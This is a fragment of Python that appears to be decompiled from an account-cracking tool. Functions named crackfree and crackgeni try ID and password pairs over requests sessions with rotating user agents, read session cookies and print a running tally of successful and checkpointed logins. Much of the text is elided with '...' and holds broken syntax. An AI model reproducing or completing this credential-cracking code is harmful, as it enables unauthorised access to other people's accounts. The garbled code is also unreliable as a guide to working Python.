...
def Authkey():
    ...
    Halo(text = 'Loading..💤', spinner = 'star')
...
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            ...
            def crackfree(idf, pwv):
                ...
                bo = random.choice([
                    ...
                    u,
                    x])
                (sys.stdout.write(f'''\rM2 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
...
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            ...
            def crackgeni(idf, pwv):
                ...
                bo = random.choice([
                    ...
                    u,
                    x])
                (sys.stdout.write(f'''\rM3 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
